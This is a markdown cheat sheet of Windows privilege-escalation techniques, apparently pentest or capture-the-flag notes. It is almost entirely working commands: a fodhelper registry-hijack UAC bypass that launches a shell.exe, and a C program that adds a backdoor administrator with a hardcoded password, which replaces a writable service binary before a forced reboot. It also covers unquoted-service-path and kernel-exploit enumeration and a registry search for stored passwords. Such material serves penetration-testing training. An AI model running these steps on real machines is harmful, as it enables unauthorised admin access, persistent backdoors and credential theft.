# Windows Privilege Escalation

## Bypass UAC via registry hijacking 

Check Mandatory Level

``` bash
whoami /groups
```

Run cmd.exe as Administrator to get High Mandatory Level

``` bash
powershell.exe Start-Process cmd.exe -Verb runAs
```

`C:\Windows\System32\fodhelper.exe`

``` bash
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
```

``` bash
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```

``` bash
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\windows_10_1903_x64\Desktop\shell.exe" /f
```

## Insecure File Permissions

Get Server and Path to running

Powershell >>>

``` bash
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

=== "Check permission"

	``` bash
	icacls "C:\Windows\system32\wbem\WmiApSrv.exe"
	```

=== "refer icacls"

	[icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks)

	|Mask| Permissions|
	|---|---|
	|F| Full access|
	|M| Modify access|
	|RX| Read and execute access|
	|R| Read-only access|
	|W| Write-only access|

Overwrite file if have F or W permission.

=== "Compile code adduser.c"

	``` bash
	i686-w64-mingw32-gcc adduser.c -o adduser.exe
	```

=== "adduser.c"

	``` c
	#include <stdlib.h>

	int main ()
	{
	    int add;
	    add = system ("net user backup Adm1nP@ssWD /add");
	    add = system ("net localgroup administrators backup /add");
	    return 0;
	} 
	```

Move file `adduser.exe`

``` bash
move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
```

Check StartMode for service

``` bash
wmic service where caption="Serviio" get name, caption, state, startmode
```

Check rights for restart system

``` bash
whoami /priv
```

Restart system

``` bash
shutdown /r /t 0
```

Check Administrators group

``` bash
net localgroup Administrators
```

## Leveraging Unquoted Service Paths

``` bash
wmic service get displayname,pathname
```

``` bash
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

## Kernel Exploit

### OS Version & Architecture

``` bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Driver Enumeration

``` bash
driverquery /v
```

### For Example

[Vulnerability in Ancillary Function Driver](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/003-devel_aspx-backdoor_ms11-046-6.1.7600#vulnerability-in-ancillary-function-driver)

[RGNOBJ Integer Overflow](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/006-optimum_httpfileserver-2.3_ms16-098-6.3.9600#rgnobj-integer-overflow)

[CVE-2015-1701](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/007-bastard_drupa7.54_MS15-051-6.3.9600#cve-2015-1701)

## More Reference

[https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated)

### Add Local Admin User

``` bash
net user /add <user> <pass>
```

``` bash
net localgroup administrators <user> /add
```

### Run CMD as Admin

``` bash
powershell.exe Start-Process cmd.exe -Verb runAs
```

### Clear text stored

``` bash
reg query HKLM /f pass /t REG_SZ /s
```